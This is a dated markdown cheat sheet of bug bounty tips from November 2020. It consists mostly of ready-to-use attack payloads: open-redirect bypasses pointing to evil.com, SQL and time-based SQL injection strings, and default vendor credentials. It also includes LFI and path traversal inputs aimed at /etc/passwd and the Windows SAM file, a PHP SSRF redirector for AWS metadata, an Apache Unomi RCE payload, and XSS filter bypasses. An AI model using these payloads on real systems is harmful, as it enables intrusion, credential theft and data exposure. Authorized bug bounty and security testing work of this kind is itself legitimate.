# November-2020 Bug Bounty Tips

📅 02-Nov-2020
## Open Redirect Bypass

### Payloads
```text
https:www.google.com
HtTp://google.com
http\x3A\x2F\x2Fgoogle.com
//google。com
x00http://google.com
////216.58.214.206
/\216.58.214.206
x20http://www.google.com
https://www.google.com
hthttp://tp://www.google.com
。/www.google.com
```

### Dorks & Parameter Names
```text
site:target.com AND inurl:url=http(s)
site:target.com AND inurl:u=http(s)
site:target.com AND inurl:redirect?http(s)
site:target.com AND inurl:redirect=http(s)
site:target.com AND inurl:link=http(s)
```
***Some parameter names that need attention while looking for Open Redirects:***
```text
?next=
?url=
?dest=
?redirect=
?returnTo=
?go=
?redirect_uri
?continue=
?return_path=
?externalLink=
?URL=
```

## SQL Injection Payloads
***Some updated SQLi payloads you must try:)***
```sql
+OR+1=insert(1,1,1,1)--
+OR+1=replace(1,1,1)--
{`foo`/*bar*/(select+1)\}'
{`foo`/*bar*/(select%2b2)}
{`foo`/*bar*/(select+1+from+wp_users+where+user_pass+rlike+"(^)[$].*"+limit+1)}
```

## Default Credentials
```text
Cisco: cisco:cisco
Citrix: nsroot:nsroot
Dell iDRAC: root:calvin
Juniper: super:juniper123
pfSense: admin:pfsense
SAP: SAP*:06071992
Tomcat: tomcat:tomcat
UniFi: ubnt:ubnt
Weblogic: weblogic:weblogic1
Zabbix: Admin:zabbix
```

## your target is using jfrog ? you can access it with anonymous login  through .io
use dork `site:https://www.jfrog.com inurl:yourtarget` and easy access it :) 

📅 06-Nov-2020
## Browser-Based application LFI
`file:///etc/passwd` blacklisted? Use `"view-source:file:///etc/passwd"`
"view-source" is often forgotten by developers in blacklists.
## bypassing file content restrictions:
in some cases you can do a crlf injection via filename
`x.png%22%0d%0a%0d%0a%0d%0a<script>alert(1)</script>`
***this will cause Content-Disposition to throw its content into the file***

📅 10-Nov-2020
## Race Condition
***https://hackerone.com/reports/994051***
## Host Header Injection
It was blocking all the urls except for the websites hosted with the same provider. In this case Fastly. 
```js
host : http://bbc.com
```
**worked**                    
Now attacker can register a domain with Fastly and use HHI to ATO using forgot password ! 

📅 11-Nov-2020
## SSRF Bypass via 303 redirect
*Host the following code in your server and use your server ip to ping at where you feel ssrf is found*
```php
<?php header('Location: http://169.254.169.254/latest/meta-data/', TRUE, 303); ?>
```
***Note :*** This code is to fetch aws metadata you can edit the location to your target location. For more info **https://medium.com/techfenix/ssrf-server-side-request-forgery-worth-4913-my-highest-bounty-ever-7d733bb368cb** 

📅 16-Nov-2020
## Check for open redirect,ssrf with waybackurls
```sh
waybackurls target[.]com | grep ‘http%\|https%'
```
***Note : You can replace the URLs you find with yours and hope for an open redirect,ssrf or something else. You can grep out analytic stuff with grep -v. If your target has something with OAuth with a redirect_uri target/* that's an easy ATO***
## Searching for endpoints, by apks
```sh
apktool d app.apk -o uberApk;grep -Phro "(https?://)[\w\.-/]+[\"'\`]" uberApk/ | sed 's#"##g' | anew | grep -v "w3\|android\|github\|http://schemas.android\|google\|http://goo.gl"
```
## Fuzz all js files from the target
```sh
xargs -P 500 -a domain -I@ sh -c 'nc -w1 -z -v @ 443 2>/dev/null && echo @' | xargs -I@ -P10 sh -c 'gospider -a -s "https://@" -d 2 | grep -Eo "(http|https)://[^/\"].*\.js+" | sed "s#\] \- #\n#g" | anew'
```

📅 17-Nov-2020
## OPen redirect Bypass payloads
```text
http:http:evil[.]com
http:/evil%252ecom
///www.x.com@evil.com
```
## Recent XSS triple bypass surgery:
```js
DOM XSS via $.append(<PAYLOAD>)
1. WAF: <script> blocked but <script/a> isn’t (lol)
2. All uppercased: Instead of direct JS (ALERT isn’t valid), use <script/src>
3. 20 char limit(!!): Used my 5 char domain <script/src=//ab.cd> 
```
***thanks to [@spaceracoon](https://twitter.com/spaceraccoonsec)***
## Bug bounty cheatsheet
***https://github.com/EdOverflow/bugbounty-cheatsheet***
## Blind SQL Injection
***https://hackerone.com/reports/1034625***

📅 20-Nov-2020
## CVE-2020-13942 Apache Unomi Remote Code Execution
```json
{"filters":[{"id" : "pyn3rd","filters": [{"condition": {"parameterValues": {"pyn3rd": "script::Runtime.getRuntime().exec('open -a Calculator')"},"type":"profilePropertyCondition"}}]}],"sessionId": "pyn3rd"}
```
- [Proof of Concept](img/-%20CVE-2020-13942%20Apache%20Unomi%20Remote%20Code%20Execution__PoC__%7B_filters___%7B_id_%20_%20_py.mp4)

📅 22-Nov-2020
## 🔥Using dnsgen to find new domains from a list of domains, I used amass on the list (army1).
🔥 xargs -a army1 -I@ sh -c 'echo @' | dnsgen - | httpx -silent -threads 1000 🔥
#Bugbounty #bugbountytips #recon #github #KingOfBugBountyTips
## SSTI
If your username and last name fields are vulnerable to HTML injection, try SSTI vulnerability too! 
SSTI can be made with RCE. This is a typical SSTI Payload.
`{{ '7'*7 }}`
We need to identify what template engine is used in the back-end as well to exploit further to get RCE.
- `if {{ 7*'7′ }} -> 7777777` -> Its Jinja2 Engine
- `if {{ 7*'7′ }} -> 49` -> Its Twig Engine
#bugbountytips

📅 22-Nov-2020
## (Jira Webroot Directory Traversal)
```url
http://target.domain/s/anything/_/META-INF/maven/com.atlassian.jira/atlassian-jira-webapp/pom.xml
OR
-site.atlassian.net/s/anything/_/META-INF/maven/com.atlassian.jira/atlassian-jira-webapp/pom.properties
```
*pom.xml or txt*

📅 24-Nov-2020
## Time Based SQL Injection
*2,077 millis*
```sql
'XOR(if(now()=sysdate(),sleep(1*1),0))OR'
```
**[more info](https://hackerone.com/reports/1024984)**

📅 26-Nov-2020
## Wordpress xmlrpc
### Discover the Methods
```xml
<?xml version="1.0" encoding="utf-8"?>
<methodCall>
<methodName>system.listMethods</methodName>
<params></params>
</methodCall>
```
### Call Method Ping Back for SSRF
```xml
<?xml version="1.0" encoding="UTF-8"?>
<methodCall>
<methodName>pingback.ping</methodName>
<params>
<param>
<value><string>https://abc.burpcollaborator.net</string></value>
</param>
<param>
<value><string>https:abc.com/blog/post1</string></value>
</param>
</params>
</methodCall>
```

📅 27-Nov-2020
## Path Traversal Tips
1. Always try path traversal sequences using both forward slashes and backslashes. Many input filters check for only one of these, when the filesystem may support both.
2. Try simple URL-encoded representations of traversal sequences using the
following encodings. Be sure to encode every single slash and dot within
your input:
- Dot — %2e
- Forward slash — %2f
- Backslash — %5c
3. Try using 16-bit Unicode encoding:
- Dot — %u002e
- Forward slash — %u2215
- Backslash — %u2216
4. Try double URL encoding:
- Dot — %252e
- Forward slash — %252f
- Backslash — %255c
5. Try overlong UTF-8 Unicode encoding:
- Dot — %c0%2e, %e0%40%ae, %c0ae, and so on
- Forward slash — %c0%af, %e0%80%af, %c0%2f, and so on
- Backslash — %c0%5c, %c0%80%5c, a
6. If the application is attempting to sanitize user input by removing traversal sequences and does not apply this filter recursively, it may be
possible to bypass the filter by placing one sequence within another. For
example:
```text
....//
....\/
..../\
....\\
```
**Example**
```text
../../../../../boot.ini%00.jpg
filestore/../../../../../../../etc/passwd
diagram1.jpg%00.jpg
../../../../../../../../../../../../etc/passwd
../../../../../../../../../../../../windows/win.ini
../../../../../../../../../../../../writetest.txt
../../../../../../../../../../../../windows/system32/config/sam
../../../../../../../../../../../../tmp/writetest.txt
../../../../../../../../../../../../tmp
```

📅 30-Nov-2020
## Reflected XSS
```sh
amass enum -passive -norecursive -noalts -d domain .com -o domain.txt
cat domian.txt | httpx -o domainhttpx.txt
cat domainhttpx.txt | nuclei -t /home/orwa/nuclei-templates
```
## Bypass Rate Limiting by 
- Adding Collaborator<br>
        ⬇️<br>
- Fetch an normal request<br>
        ⬇️<br>
- Removing Collaborator<br>
        ⬇️<br>
***Repeat the same***<br>
***Source: https://ahmdhalabi.medium.com/chaining-multiple-requests-to-achieve-rate-limiting-vulnerabilities-96c1e8365c06***
